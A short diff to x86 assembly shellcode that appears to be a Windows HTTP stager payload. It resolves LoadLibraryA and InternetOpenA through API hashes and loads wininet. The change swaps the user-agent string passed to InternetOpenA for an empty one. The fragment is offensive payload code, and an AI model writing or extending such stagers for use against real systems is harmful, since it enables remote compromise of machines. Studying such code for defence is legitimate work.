@@ -12,7 +12,6 @@
 load_wininet:
   push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
   push 0x696e6977        ; ...
-  mov esi, esp           ; Save a pointer to wininet
   push esp               ; Push a pointer to the "wininet" string on the stack.
   push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
   call ebp               ; LoadLibraryA( "wininet" )
@@ -23,7 +22,8 @@ internetopen:
   push edi               ; LPCTSTR lpszProxyBypass
   push edi               ; LPCTSTR lpszProxyName
   push edi               ; DWORD dwAccessType (PRECONFIG = 0)
-  push esi               ; LPCTSTR lpszAgent ("wininet\x00")
+  push byte 0            ; NULL pointer  
+  push esp               ; LPCTSTR lpszAgent ("\x00")
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
